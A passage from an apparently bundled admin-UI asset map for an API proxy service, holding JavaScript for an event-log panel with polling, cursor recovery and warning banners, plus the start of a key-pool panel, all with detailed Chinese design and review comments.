`usageDateHandler` 上方逐条写着）。\n * ⇒ **这里只用 `Object.keys()` + 下标取值**，\n * **不许调 `.hasOwnProperty()` / `.toString()` 这类挂在 `Object.prototype` 上的方法**\n * ——那条原型链上什么都没有，调用会直接 `TypeError`。\n *\n * `sort` 用的是**键的字典序**，不是按请求数降序：键里会出现客户端填进来的任意串，\n * 而按值排序会让同一天的两次刷新在数字相等时给出不同的行序（读的人以为数据变了）。\n * ⚠️ **`hours` 的键是 `\"0\"`…`\"23\"`，字典序会把 `\"10\"` 排在 `\"2\"` 前面**\n * ⇒ 小时表由调用方传 `numeric: true` 走数值序。**两种序都在这里，板块不自己排。**\n */\nexport function breakdownRows(map, numeric) {\n  const m = obj(map);\n  if (m === null) return [];\n  const keys = Object.keys(m);\n  if (numeric === true) {\n    keys.sort((a, b) => {\n      const x = finite(Number(a));\n      const y = finite(Number(b));\n      if (x === null || y === null) return a < b ? -1 : a > b ? 1 : 0;\n      return x - y;\n    });\n  } else {\n    keys.sort();\n  }\n  return keys.map((k) => ({ key: k, total: obj(m[k]) }));\n}\n\n/**\n * `capabilities.stats.tokensCoverage`（裸 `string[]` 的协议 **id**）\n * → `GET /admin/api/models` 的 `protocols[].label`（展示名）。\n *\n * ⚠️ **三条都不许走**（P3d Task 5 评审 I20）：\n * ① 本地再写一张 id → 名的映射 —— 那是第二份知识，与\n *    `src/core/admin/protocol-catalog.ts` 的 `PROTOCOLS` 迟早漂；\n * ② 把 id 拼进一个 i18n key（`t(某个前缀 + id)`）—— 违反全局约束 12，\n *    且对 i18n 门禁完全隐身（它只认得引号紧跟在后面的那种字面量引用）；\n * ③ 直接渲染裸 id —— 运维看不懂 `responses` 是哪个协议。\n * `label` **刻意不进 i18n**：它是协议的专名（\"OpenAI Chat Completions\"），\n * 翻译它只会制造歧义（`ProtocolEntry.label` 上方逐字写着这一条）。\n *\n * ⚠️ **有一条 id 解析不出来就整条退回 `null`，不给半张名单**：\n * 半张名单会让运维**少估**覆盖范围，而这个 tooltip 的全部用途就是回答\n * 「Token 这张卡到底盖住了哪几条协议」。调用方拿到 `null` 时改说一句\n * 「覆盖范围读不出来」，而不是把残缺的那半当成全部。\n */\nexport function tokensCoverageLabels(coverage, protocols) {\n  if (!Array.isArray(coverage) || coverage.length === 0) return null;\n  if (!Array.isArray(protocols)) return null;\n  const out = [];\n  for (const id of coverage) {\n    let label = null;\n    for (const p of protocols) {\n      const entry = obj(p);\n      if (entry !== null && entry.id === id && typeof entry.label === \"string\" && entry.label !== \"\") {\n        label = entry.label;\n        break;\n      }\n    }\n    if (label === null) return null;\n    out.push(label);\n  }\n  return out;\n}\n\n/**\n * 未落盘的尾巴。`null` = 这条信息本身拿不到（Tier-2 没开，或者整块 `pending` 是 null）。\n *\n * ⚠️⚠️ **`ms` 数的是「距上一次落盘*尝试*多久」，不是「距上一次写成功多久」**\n *（`src/http/usage-sink.ts` 的 `status()` 上方写着全文）⇒ **`count > 0 && ms ≈ 0`\n * 要读作「刚试过、没写成」，不是「没有尾巴」**。判别尾巴的字段是 `count`，**不是 `ms`**。\n * ⇒ 本函数因此**只拿 `count` 当「有没有尾巴」的判据**，`ms` 只原样带出去给文案用。\n *\n * `budgetExhausted` 必须一起带出来：预算耗尽与存储抛错这两种失败态在\n * `count` + `ms` 上长得一模一样，砍掉它面板就只能猜。\n */\nexport function pendingTail(resp) {\n  const r = obj(resp);\n  const p = r === null ? null : obj(r.pending);\n  if (p === null) return null;\n  const count = finite(p.count);\n  if (count === null || count <= 0) return null;\n  return { count, ms: finite(p.ms), budgetExhausted: p.budgetExhausted === true };\n}\n", type: "text/javascript; charset=utf-8", etag: "\"98c84478e9550ef1\"" },
  "/admin/js/sec-events.js": { body: "/**\n * 事件板块（设计文档 §10.7，本期形状见 P3b 计划 Task 6 Step 7）：\n * 搜索框 + 级别按钮组 + 暂停 + 清空（仅清前端视图）+ 下载 + 自动滚动 + 轮询状态指示灯。\n *\n * 板块契约（设计文档 §9.3）：`{ init?, onShow?, onHide? }`，见 admin-ui/js/app.js\n * 的 showSection。**板块内不许监听 langchange**——框架层会 apply(document) 之后\n * 重跑一次 onShow()。\n *\n * 两条纪律：①一切来自接口的内容一律 textContent；②**取值决策一律不写在这里**，\n * 全在 `js/pure/events.mjs` 里由 `tests/ui/events.test.ts` 跑着（admin-ui/README.md\n * 硬规则 1）。这个文件只剩 DOM 拼装、事件绑定与网络调用。\n *\n * **事件字段视为完全不可信**（里面会出现上游返回的内容与未鉴权请求的路径）：\n * 所有字段一律 `textContent`，绝不 `innerHTML`。\n */\nimport { api } from \"./api.js\";\nimport { t } from \"./i18n.js\";\nimport { el, elI18n, toast } from \"./ui.js\";\nimport { fmtInstant } from \"./pure/format.mjs\";\nimport {\n  LEVELS, levelLabelKey, effectiveLevel, eventLevelLabelKey, levelBadgeClass,\n  eventsQuery, itemsOf, eventsListMessageKey, shardIdOf, generatedAtOf, bufferStatus, shouldWarn,\n  initialPollState, resumePollState, pollOutcome, pollIndicatorState, pollIndicatorLabelKey,\n  matchesSearch, buildDetailText, groupEvents, orderForDisplay, mergeIntoView,\n} from \"./pure/events.mjs\";\n// P3b 待办第 8 条：本地时区偏移三个板块共用同一个函数，见 pure/overview.mjs\n// 的 offsetMs() 文件头——事件板块并不比它更\"是概览板块的事\"，只是那个函数\n// 已经是三个板块公认的共用取值落脚点。\nimport { offsetMs } from \"./pure/overview.mjs\";\n\nconst LIMIT = 200;\n\n/** 板块内部状态。`level` 是 \"all\" 或 LEVELS 里的一个。 */\nconst state = { q: \"\", level: \"all\", paused: false, autoScroll: true };\n\nlet nodes = null;\nlet timer = null;\nlet abort = null;\n/** 客户端已攒下的视图（ts 降序，与后端契约一致；渲染前用 orderForDisplay 反转）。 */\nlet view = [];\n/**\n * 「视图是被『清空』按钮清掉的，不是本来就没有事件」（全分支评审 I5）。\n *\n * 只影响列表区那句话该怎么写（判据在 `pure/events.mjs` 的 `eventsListMessageKey`），\n * 不影响游标——被清掉的事件**刻意**不会自动回来，理由见那个函数的说明。\n * 换筛选级别时归零：那时视图是被整段重拉的，不是被清掉的。\n */\nlet cleared = false;\n/**\n * 最近一次成功响应的自述状态。`cursorBroken` 不来自响应字段，来自\n * `pure/events.mjs` 的 `cursorOutcome`（后端契约有没有被破坏是**前端判出来的**，\n * 后端自己不会承认），但它与其余几项走同一条渲染路径：都由 `shouldWarn` 决定\n * 黄条出不出现（评审 I6）。\n */\nlet lastStatus = {\n  dropped: null, budgetExhausted: null, truncated: null, buffered: null,\n  cursorAhead: null, malformed: null, cursorBroken: false,\n};\n/** 最近一次成功响应里的本 isolate 分片 id（评审 M2），驱动轮询指示灯的提示文案。 */\nlet lastShardId = null;\n/** 最近一次成功响应的生成时刻（评审 N1 [LOW]），同样只驱动轮询指示灯的提示文案。 */\nlet lastGeneratedAt = null;\n/**\n * 轮询的全部跨轮状态（游标 / 自愈中 / 退避间隔）。**整体来自 `pollOutcome()` 的\n * `next`，这个文件不再自己算它的任何一个字段**——评审四审 B1：上一版把\"上一轮的\n * 自愈不算这一轮的新内容\"这条跨轮规则的一半写在这里（`justHealed = outcome.resetView`），\n * 而这个文件没有任何自动化覆盖，把那一行改成恒 false 全套用例一条都不红。\n * 判据全部搬回 pure/events.mjs（admin-ui/README.md 硬规则 1）。\n */\nlet pollState = initialPollState();\nlet lastError = false;\nlet loadError = false;\n/** 本板块当前是不是\"正在显示\"这一个（`onShow`/`onHide` 之间）。visibilitychange\n * 处理器据此判断\"该不该在页面重新可见时把轮询接回去\"——不加这一层的话，\n * 离开本板块时 `onHide` 已经把 timer 清成了 null，页面从别的 tab 切回来会\n * 误判成\"因为隐藏而停了\"，把本该保持停着的轮询重新点起来。 */\nlet sectionActive = false;\n\nfunction renderWarnings() {\n  const banner = nodes.warnBanner;\n  banner.style.display = shouldWarn(lastStatus) ? \"\" : \"none\";\n\n  nodes.warnDropped.style.display = lastStatus.dropped !== null && lastStatus.dropped > 0 ? \"\" : \"none\";\n  if (lastStatus.dropped !== null && lastStatus.dropped > 0) {\n    nodes.warnDropped.textContent = t(\"ev.warnDropped\", { count: lastStatus.dropped });\n  }\n\n  nodes.warnBudget.style.display = lastStatus.budgetExhausted === true ? \"\" : \"none\";\n  if (lastStatus.budgetExhausted === true) nodes.warnBudget.textContent = t(\"ev.warnBudget\");\n\n  nodes.warnTruncated.style.display = lastStatus.truncated === true ? \"\" : \"none\";\n  if (lastStatus.truncated === true) nodes.warnTruncated.textContent = t(\"ev.warnTruncated\");\n\n  // 评审 C6：`cursorAhead` 为 true 时 `poll()` 已经把 `pollState.after` 自愈成\n  // null（见下方 poll()），下一轮就会带着新游标重新冷读——这条提示只是让运维知道\n  // \"刚刚发生过一次自动恢复\"，不是要人手动做什么。\n  // ⚠️ 评审四审：这条黄条**逐轮覆盖、没有粘性**——`cursorAhead=false` 的那一轮\n  // 它就灭了。持续的跨 isolate 时钟偏移下它会跟着视图一起闪（亮一轮灭一轮），\n  // 不是\"持续亮着的告警\"。**这一行的\"粘不粘\"本身仍然没有自动化守护**\n  //（实测把它改成粘性全套用例照样全绿）。\n  //\n  // ⚠️ **这里原来写的理由是「本仓无 DOM 测试通道」——那句话早就不成立了**：\n  // `tests/ui/dom/` 有 harness + 五组用例，`events-poll.test.ts` 就在真点导航\n  // 按钮、真驱动本板块，本任务还用它钉住了 `warnCursorBroken` 的接线\n  //（「响应体缺 cursor 字段时，契约破坏那条黄条真的显示出来」）。\n  // 真实的缺口只剩**\"逐轮覆盖 vs 粘性\"这条时序性质**——那要一组跨轮的 DOM 断言，\n  // 不是\"没有通道\"。**登记为已知盲点，不许再用那个已经作废的理由搪塞过去。**\n  // `tests/contract/events-cursor-heal.test.ts`\n  // 的「交替命中两个时钟不同步的 isolate……不是永远卡在 15 秒」钉住的是它的**输入**\n  // ——后端 cursorAhead 字段逐轮交替这个根因。\n  // ⚠️ **这个锚是 P3c Task 1 改过的**：原文写的是「持续偏移下……黄条」，\n  // 那个文件里**根本没有**这个标题的用例，旧判据拿整份文件当干草堆才没抓住。\n  nodes.warnCursorAhead.style.display = lastStatus.cursorAhead === true ? \"\" : \"none\";\n  if (lastStatus.cursorAhead === true) nodes.warnCursorAhead.textContent = t(\"ev.warnCursorAhead\");\n\n  // 评审 I6：后端契约被破坏（`cursor` 既不是有限数字也不是 null）。**上黄条，\n  // 不是只进 tooltip**——它意味着后端此刻正在违约、面板可能永远看不到新事件，\n  // 而一个悬停才看得见的提示把「面板在撒谎」降级成了「面板在小声说」。\n  nodes.warnCursorBroken.style.display = lastStatus.cursorBroken === true ? \"\" : \"none\";\n  if (lastStatus.cursorBroken === true) nodes.warnCursorBroken.textContent = t(\"ev.warnCursorBroken\");\n}\n\nfunction renderPollIndicator() {\n  const kind = pollIndicatorState({ paused: state.paused, lastError });\n  nodes.pollDot.className = `poll-dot poll-dot-${kind}`;\n  let label = t(pollIndicatorLabelKey(kind));\n  if (lastShardId !== null) label += t(\"ev.pollStatus.shardSuffix\", { shardId: lastShardId });\n  // 评审 N1：`buffered` 是\"本 isolate 还没落盘的事件数\"——单纯有数字不算异常\n  // （见 pure/events.mjs 的 shouldWarn 注释），但 isolate 随时可能被回收，\n  // 这里没有黄条那么显眼，但至少让愿意看 tooltip 的人看得到这个风险。\n  if (lastStatus.buffered !== null && lastStatus.buffered > 0) {\n    label += t(\"ev.pollStatus.bufferedSuffix\", { count: lastStatus.buffered });\n  }\n  // 本任务：`malformed` **恒为 0 正是它的价值**——它是那几条 `narrowEntries`\n  // 用例在生产环境里的对照组。非 0 就说明存储被外部写坏过（运维手改 KV /\n  // KV 值损坏 / `store.json` 写到一半），它是唯一能把「面板少了几条事件」与\n  // 「本来就没有事件」区分开的信号。**刻意不上黄条**（见 pure/events.mjs 的\n  // `shouldWarn`）：恒为假的分支挂在告警判据上没有意义。\n  if (lastStatus.malformed !== null && lastStatus.malformed > 0) {\n    label += t(\"ev.pollStatus.malformedSuffix\", { count: lastStatus.malformed });\n  }\n  // 评审 N1 [LOW]：`generatedAt` 是响应生成时刻，最小、低风险的消费方式——\n  // 让 tooltip 报一句\"数据截至几点\"，运维不用另外去猜面板有没有卡住。\n  if (lastGeneratedAt !== null) {\n    label += t(\"ev.pollStatus.generatedAtSuffix\", { time: fmtInstant(lastGeneratedAt, offsetMs()) });\n  }\n  nodes.pollDot.title = label;\n  nodes.pollDot.setAttribute(\"aria-label\", label);\n}\n\nfunction eventRow(item, grouped) {\n  const tr = el(\"tr\", { class: grouped ? \"ev-row ev-row-grouped\" : \"ev-row\" });\n  tr.appendChild(el(\"td\", { class: \"mono\" }, fmtInstant(item && item.ts, offsetMs())));\n  const levelCell = el(\"td\");\n  const level = effectiveLevel(item);\n  levelCell.appendChild(el(\"span\", { class: levelBadgeClass(level) }, t(eventLevelLabelKey(level))));\n  tr.appendChild(levelCell);\n  tr.appendChild(el(\"td\", { class: \"mono\" }, item && typeof item.event === \"string\" ? item.event : \"\"));\n  tr.appendChild(el(\"td\", null, buildDetailText(item)));\n  return tr;\n}\n\nfunction groupHeaderRow(group) {\n  const tr = el(\"tr\", { class: \"ev-group-header\" });\n  const td = el(\"td\", { colspan: \"4\", class: \"muted\" },\n    t(\"ev.timeline\", { count: group.items.length, corr: group.corr }));\n  tr.appendChild(td);\n  return tr;\n}\n\nfunction render() {\n  renderWarnings();\n  renderPollIndicator();\n\n  const host = nodes.body;\n  host.textContent = \"\";\n\n  const filtered = view.filter((item) => matchesSearch(item, state.q));\n  const messageKey = eventsListMessageKey(loadError, view.length, filtered.length, cleared);\n  if (messageKey !== null) {\n    host.appendChild(elI18n(\"p\", messageKey, { class: \"muted\" }));\n    return;\n  }\n\n  const table = el(\"table\");\n  const head = el(\"tr\");\n  for (const key of [\"ev.col.time\", \"ev.col.level\", \"ev.col.event\", \"ev.col.detail\"]) {\n    head.appendChild(elI18n(\"th\", key));\n  }\n  table.appendChild(head);\n\n  const groups = groupEvents(orderForDisplay(filtered));\n  for (const group of groups) {\n    if (group.items.length > 1) table.appendChild(groupHeaderRow(group));\n    for (const item of group.items) table.appendChild(eventRow(item, group.items.length > 1));\n  }\n  host.appendChild(table);\n\n  if (state.autoScroll) host.scrollTop = host.scrollHeight;\n}\n\nasync function poll() {\n  if (abort) abort.abort();\n  abort = new AbortController();\n  try {\n    const query = eventsQuery({ ...state, after: pollState.after, limit: LIMIT });\n    const body = await api.get(`/events?${query}`, { signal: abort.signal });\n    const items = itemsOf(body) ?? [];\n    lastStatus = bufferStatus(body);\n    lastShardId = shardIdOf(body);\n    lastGeneratedAt = generatedAtOf(body);\n    loadError = false;\n    lastError = false;\n    // 评审 C6 二审 / 四审 B1：游标自愈、视图要不要跟着清空、退避间隔看不看到\n    // \"新内容\"、自愈状态什么时候清位——同一个纯状态转换的四个面，**全部**在\n    // pollOutcome() 里（admin-ui/README.md 硬规则 1）。这里只剩两件拼装：视图\n    // 要不要清、把返回的下一轮状态整体收下。一个判据都不许再回到这个文件。\n    const outcome = pollOutcome(pollState, items, body && body.cursor, lastStatus.cursorAhead);\n    // 后端吐的 `cursor` 不是「有限数字或 null」——**保留游标，但把这件事说出去**。\n    // 判据在 `pure/events.mjs` 的 `cursorOutcome` / `shouldWarn`，这里只是把它\n    // 塞进 `lastStatus`（一个判据都不许回到这个文件，admin-ui/README.md 硬规则 1）。\n    lastStatus = { ...lastStatus, cursorBroken: outcome.cursorBroken };\n    if (outcome.resetView) view = [];\n    view = mergeIntoView(view, items);\n    // 视图里重新有内容了，「已清空」那句话就不再成立（它只描述\"空是怎么来的\"）。\n    if (view.length > 0) cleared = false;\n    pollState = outcome.next;\n  } catch (e) {\n    if (e && e.name === \"AbortError\") return;\n    lastError = true;\n    loadError = true;\n    // **不清空 view**：一次轮询失败不该把已经看到的历史事件抹掉，那比「暂时看不到\n    // 最新的」更像撒谎——运维正在盯着的是一条正在增长的时间线，不是一个可替换的快照。\n  }\n  render();\n  scheduleNext();\n}\n\nfunction scheduleNext() {\n  if (timer !== null) { clearTimeout(timer); timer = null; }\n  if (state.paused || document.hidden) return;\n  timer = setTimeout(() => { poll(); }, pollState.delayMs);\n}\n\nfunction stopPolling() {\n  if (timer !== null) { clearTimeout(timer); timer = null; }\n  if (abort) { abort.abort(); abort = null; }\n}\n\n/**\n * 页面从隐藏变回可见时，把因为 `document.hidden` 而停掉的轮询接回去。\n *\n * **只在本板块当前处于\"正在显示\"时才生效**（`sectionActive`）：不加这一层，\n * 从别的 tab 切回来时会把任何板块（哪怕当前显示的是概览页、本板块早被\n * `onHide` 正常停掉）误判成\"因为隐藏而停了\"，重新点起一轮不该发生的请求。\n * 只注册一次（模块级监听，不随 init/onShow 重复挂）。\n */\ndocument.addEventListener(\"visibilitychange\", () => {\n  if (!document.hidden && sectionActive && !state.paused && timer === null) poll();\n});\n\nasync function download() {\n  try {\n    const res = await api.raw(\"GET\", \"/events/download\");\n    const text = await res.text();\n    const blob = new Blob([text], { type: \"text/plain;charset=utf-8\" });\n    const url = URL.createObjectURL(blob);\n    const a = el(\"a\", { href: url, download: \"agnes2api-events.txt\" });\n    document.body.appendChild(a);\n    a.click();\n    a.remove();\n    URL.revokeObjectURL(url);\n  } catch (e) {\n    // 下载失败要让用户看得见——按钮点了没反应、又没有任何提示，是本仓已经踩过的\n    // 那类\"看起来什么都没发生\"的坑，本仓已经有 toast 这个组件，直接用。\n    toast(t(\"ev.downloadFailed\"), \"err\");\n  }\n}\n\nfunction buildToolbar() {\n  const bar = el(\"div\", { class: \"toolbar\" });\n\n  const search = el(\"input\", { type: \"search\", \"data-i18n-ph\": \"ev.search\" });\n  search.setAttribute(\"placeholder\", t(\"ev.search\"));\n  search.addEventListener(\"input\", () => { state.q = search.value; render(); });\n  bar.appendChild(search);\n\n  const levelGroup = el(\"div\", { class: \"btn-group\" });\n  const levelButtons = {};\n  const allBtn = elI18n(\"button\", \"ev.level.all\", { type: \"button\", class: \"btn-toggle active\" });\n  allBtn.addEventListener(\"click\", () => { setLevel(\"all\"); });\n  levelGroup.appendChild(allBtn);\n  levelButtons.all = allBtn;\n  for (const lvl of LEVELS) {\n    const b = elI18n(\"button\", levelLabelKey(lvl), { type: \"button\", class: \"btn-toggle\" });\n    b.addEventListener(\"click\", () => { setLevel(lvl); });\n    levelGroup.appendChild(b);\n    levelButtons[lvl] = b;\n  }\n  bar.appendChild(levelGroup);\n\n  const pauseBtn = elI18n(\"button\", \"ev.pause\", { type: \"button\" });\n  pauseBtn.addEventListener(\"click\", () => {\n    state.paused = !state.paused;\n    pauseBtn.textContent = t(state.paused ? \"ev.resume\" : \"ev.pause\");\n    pauseBtn.setAttribute(\"data-i18n\", state.paused ? \"ev.resume\" : \"ev.pause\");\n    renderPollIndicator();\n    if (state.paused) stopPolling(); else scheduleNext();\n  });\n  bar.appendChild(pauseBtn);\n\n  const clearBtn = elI18n(\"button\", \"ev.clear\", { type: \"button\", \"data-i18n-title\": \"ev.clearTip\" });\n  clearBtn.title = t(\"ev.clearTip\");\n  // **清空之后必须置位 `cleared`**（全分支评审 I5）：不置位的话列表区会显示\n  // 「还没有事件。」，与这个按钮自己的 tooltip 当场矛盾，而且那是假话——服务端\n  // 明明有事件。游标刻意不回退（理由见 pure/events.mjs 的 eventsListMessageKey）。\n  clearBtn.addEventListener(\"click\", () => { view = []; cleared = true; render(); });\n  bar.appendChild(clearBtn);\n\n  const downloadBtn = elI18n(\"button\", \"ev.download\", { type: \"button\" });\n  downloadBtn.addEventListener(\"click\", () => { download(); });\n  bar.appendChild(downloadBtn);\n\n  const autoScrollWrap = el(\"label\", { class: \"auto\" });\n  const autoScrollBox = el(\"input\", { type: \"checkbox\" });\n  autoScrollBox.checked = state.autoScroll;\n  autoScrollBox.addEventListener(\"change\", () => { state.autoScroll = autoScrollBox.checked; });\n  autoScrollWrap.appendChild(autoScrollBox);\n  autoScrollWrap.appendChild(elI18n(\"span\", \"ev.autoScroll\"));\n  bar.appendChild(autoScrollWrap);\n\n  const pollDot = el(\"span\", { class: \"poll-dot poll-dot-active\" });\n  bar.appendChild(pollDot);\n\n  function setLevel(lvl) {\n    state.level = lvl;\n    for (const [k, b] of Object.entries(levelButtons)) b.classList.toggle(\"active\", k === lvl);\n    // 切换级别相当于换了一条筛选后的流：已攒的视图是按旧筛选拉来的，继续拼接会让\n    // 「全部/error」两种视图的历史深度不一致。重置视图与整份轮询状态（游标、\n    // 自愈中、退避一起归零），从当前时刻重新拉。\n    view = [];\n    cleared = false;\n    pollState = initialPollState();\n    poll();\n  }\n\n  return { bar, pollDot };\n}\n\nexport const eventsSection = {\n  init(section) {\n    section.textContent = \"\";\n    section.appendChild(elI18n(\"h2\", \"ev.title\"));\n    section.appendChild(elI18n(\"p\", \"ev.notice\", { class: \"muted note\" }));\n\n    const warnBanner = el(\"div\", { class: \"banner-danger\" });\n    warnBanner.style.display = \"none\";\n    const warnDropped = el(\"p\");\n    const warnBudget = el(\"p\");\n    const warnTruncated = el(\"p\");\n    const warnCursorAhead = el(\"p\");\n    const warnCursorBroken = el(\"p\");\n    warnBanner.appendChild(warnDropped);\n    warnBanner.appendChild(warnBudget);\n    warnBanner.appendChild(warnTruncated);\n    warnBanner.appendChild(warnCursorAhead);\n    warnBanner.appendChild(warnCursorBroken);\n    section.appendChild(warnBanner);\n\n    const tb = buildToolbar();\n    section.appendChild(tb.bar);\n\n    const body = el(\"div\", { class: \"events-body\" });\n    section.appendChild(body);\n\n    nodes = {\n      body, warnBanner, warnDropped, warnBudget, warnTruncated,\n      warnCursorAhead, warnCursorBroken, pollDot: tb.pollDot,\n    };\n  },\n\n  onShow() {\n    sectionActive = true;\n    loadError = false;\n    lastError = false;\n    // 保留游标（已经看过的事件不该因为切走又切回来再拉一遍），退避与自愈状态归零。\n    // 这条同样是判据，写在 pure/events.mjs 里，不在这里手写三行赋值。\n    pollState = resumePollState(pollState);\n    poll();\n  },\n\n  onHide() {\n    sectionActive = false;\n    stopPolling();\n  },\n};\n", type: "text/javascript; charset=utf-8", etag: "\"e5c105d68c322fdf\"" },
  "/admin/js/sec-keys.js": { body: "/**\n * Key 池板块。P3b 只做了只读部分（状态筛选 → 4 张汇总卡 → 分页列表 → 新鲜度提示）；\n * **P3c Task 4 在此之上加写操作**：行内动作（停用/启用/清冷却/清连续失败/解除剔除/\n * 删除）、批量条（选中才出现）、导入弹窗。\n *\n * ⚠️ **「清连续失败」是控制端追加裁定补的**：设计 §10.2 的行内动作清单本来就有\n * 「清 strikes」，后端 `PATCH` 的 `clearStrikes` 字段 Task 3 也已经实现全，\n * 是本任务简报第一版的动作清单漏列了它。\n *\n * ⚠️ **P3d Task 9 又加了一颗「验活」**，它与上面那六颗**不是同一类东西**：\n * 那六颗都写存储，它一个字段都不写（`src/http/admin/handlers/verify.ts` 的\n * 约束 1）。它是这一行里唯一一个**按下去会真的打一次上游**的按钮，\n * 护栏在后端（`src/http/admin/probe-guard.ts`，与注册机的通道连通性测试共用\n * 同一份），前端这一侧只负责「一次一发」「结果就地显示」「切走时作废」。\n * **绝不做批量验活**——按 key 数量真打上游，与「立即补池」是同型的自毁按钮\n *（设计 §10.2），反向断言在\n * `tests/ui/dom/keys-verify.test.ts`「批量条里没有验活按钮 —— 批量验活按 key 数量真打上游，是自毁按钮（设计 §10.2）」。\n *\n * 板块契约（设计文档 §9.3）：`{ init?, onShow?, onHide? }`，见 admin-ui/js/app.js\n * 的 showSection。**板块内不许监听 langchange**——框架层会 apply(document) 之后\n * 重跑一次 onShow()。\n *\n * 三条纪律：①一切来自接口的内容一律 textContent；②**取值决策原则上不写在这里**，\n * 绝大多数在 `js/pure/keys.mjs`（只读部分）与 `js/pure/keys-write.mjs`（写操作）里，\n * 分别由 `tests/ui/keys.test.ts` 与 `tests/ui/keys-write.test.ts` 跑着\n * （admin-ui/README.md 硬规则 1）。\n *\n * ⚠️⚠️ **「一律不写在这里」这句话被评审证伪过两轮，别再说\"一律\"**：早先的版本\n * 与本文件的一个更早草稿都这么写，而下面这些判据当时确实住在这个文件里，\n * 逐条搬进了 `pure/keys-write.mjs`（本文件现在只调用）：\n *   · `headerSelectAllChecked` / `bulkBarVisible` / `isMustDisableFirstConflict` /\n *     `isOpaqueErrorMessage` / `NOTE_MAX_LENGTH`（第一轮）；\n *   · `toggleSelection`（单行勾选的去重加入/过滤移除）/ `applySelectAll`\n *     （全选/取消全选的并集/差集）/ `hasNote`（备注格显示内容还是显示 —）/\n *     `knobsLoaded`（三个旋钮\"只拉一次\"的判据）/ `bulkResultPresentation`\n *     （批量结果 toast 拼哪些 key、`kind`、`sticky`）/ `importResultPresentation`\n *     （导入结果 toast 的插值参数、要不要拼\"不合法的行\"、`kind`）（第二轮）。\n *\n * **仍然留在这里、且被判定为可接受的唯一一处**（同类先例：`state.page > 1`\n * 这条翻页守卫从 P3b 起一直就在板块文件里，从未被要求搬走）：\n * `runBulkWithConfirm` 的 `ids.length === 0` 早退——这是\"点击时校验参数非空\"\n * 这一类事件处理器常规写法，不是一条业务判据。\n *\n * ⚠️⚠️ **这条\"DOM 测试直接覆盖它\"的说法被复评证伪过一次，订正如下**：原来那格\n * 用的是「批量删除」触发这个守卫，但 `bulkNeedsConfirm(\"delete\")` 恒真，点击\n * 「批量删除」只会打开一个确认弹窗，那格测试从没点确认按钮，\"没有发出请求\"\n * 实际是**确认弹窗没被确认**挡住的，跟这条早退守卫毫无关系——把守卫整个删掉，\n * 只要点的是「批量删除」，那格照样绿。现在换成「批量清冷却」（`bulkNeedsConfirm`\n * 对它恒假，点击后没有中间弹窗）触发，唯一能拦住请求的就是这条早退，这才是真的\n * 在测它（`tests/ui/dom/keys-actions.test.ts` 的「批量条一把都没选中时点击批量\n * 清冷却：不发任何请求（真正覆盖 ids.length===0 早退）」，测试自身还带一条反向\n * 自检：确认弹窗确实没有被打开过）。\n *\n * 这条纪律的诚实版本是**\"取值决策原则上不写在这里，例外必须在这里说清楚是哪些、\n * 为什么留下\"**，不是一句无条件的\"一律\"。\n *\n * ③ **`note` 是第一个「运维自由输入、又会被投影进面板」的字段**（见\n * `src/core/admin/key-view.ts` 的 `KeyView.note` 说明）——后端不转义，\n * 这里必须用 `textContent` 渲染，绝不能拼进 `innerHTML`。本文件全程只用\n * `el()` / `elI18n()`（两者内部都是 `textContent`），没有任何 `innerHTML`。\n */\nimport { api } from \"./api.js\";\nimport { t } from \"./i18n.js\";\n// 【自动注册】两项与注册机板块共用同一个确认弹窗与同一条发起路径，见下面\n// buildAddKeyMenu() 里那段说明。**不是循环依赖**：sec-registrar.js 不 import 本文件。\nimport { confirmAndTend } from \"./sec-registrar.js\";\n// 通道顺序的单一真源（字母序），与注册机板块两张卡用的是同一个常量。\nimport { CHANNELS } from \"./pure/registrar.mjs\";\nimport { el, elI18n, toast, openModal, confirmModal } from \"./ui.js\";\nimport { fmtCount, fmtDash, fmtDuration, fmtInstant, fmtPercent } from \"./pure/format.mjs\";\nimport {\n  CARDS, AUTO_SECONDS, cardCounts, badgeClass, bucketLabelKey, autoLabelKey,\n  keysQuery, cooldownRemaining, lastErrorParts, usageParts, lastUsedParts,\n  pagerState, listMessageKey, itemsOf,\n} from \"./pure/keys.mjs\";\n// `poolKnobs()` / `offsetMs()` 两个板块共用，见 pure/overview.mjs 各自的说明\n// （硬规则 1：两个板块的取值决策不许各写一份）。\nimport { poolKnobs, offsetMs } from \"./pure/overview.mjs\";\nimport {\n  isDeletable, isMustDisableFirstConflict, canClearCooldown, canUnevict, canClearStrikes,\n  toggleDisableLabelKey, rowActionNeedsConfirm, bulkNeedsConfirm,\n  selectAllIds, pruneSelection, headerSelectAllChecked, bulkBarVisible,\n  toggleSelection, applySelectAll, knobsLoaded, hasNote,\n  bulkResultSummary, bulkResultPresentation, importLines, hasImportableContent,\n  importResultCounts, importResultPresentation, noteToPatch, NOTE_MAX_LENGTH, isOpaqueErrorMessage,\n  verifyDisabledReason, verifyDisabledTitleKey, verifyResultCode, verifyTransportCode,\n  verifyResultLabelKey, VERIFY_MIN_INTERVAL_MS,\n} from \"./pure/keys-write.mjs\";\n\nconst PAGE_SIZE = 20;\n/** 搜索防抖。每敲一个字符打一次接口的话，大池子下每次都要重投影 + 序列化整池。 */\nconst SEARCH_DEBOUNCE_MS = 250;\n\nconst state = { bucket: \"all\", q: \"\", page: 1, size: PAGE_SIZE, autoSec: 0 };\n/** 批量条：当前页里被勾选的 id。换页 / 换筛选 / 重新拉取之后由 `pruneSelection()`\n *  收窄——不在当前页 `items` 里的 id 一律丢弃，理由见 pure/keys-write.mjs。 */\nlet selected = [];\n\nlet nodes = null;\nlet timer = null;\nlet searchTimer = null;\n/** 在飞请求的取消闸。离开板块 / 发起下一次请求时作废上一次，避免旧响应盖掉新数据。 */\nlet abort = null;\nlet data = null;\nlet loadError = false;\n/**\n * `POOL_CACHE_TTL_MS` / `POOL_TOUCH_INTERVAL_MS` / `kvEdgeCacheMs` 的当前生效值。\n * **只拉一次**——前两个是建 app 时读一次的部署期常量（见 wire.ts），不随\n * `ConfigHolder` 刷新，没必要跟着每次 `load()` / 自动刷新重新去问；`kvEdgeCacheMs`\n * 同样是常量。默认 null（渲染成 —），拿到之前不假装知道旧的硬编码默认值。\n */\nlet knobs = { ttl: null, touch: null, edge: null };\n\n/**\n * 验活的行内状态，**按 key id 索引**（P3d Task 9）。\n * 每一项：`{ inFlight, lastAt, code, ctl, timer }`。\n *\n * ⚠️⚠️ **它必须活在 `render()` 之外，这不是风格问题。** `render()` 中间那句\n * `host.textContent = \"\"` **把整张表清掉重建**，而 `load()` → `render()`\n * 由自动刷新定时器、搜索防抖、每一次行内/批量操作触发。状态若挂在按钮上，\n * 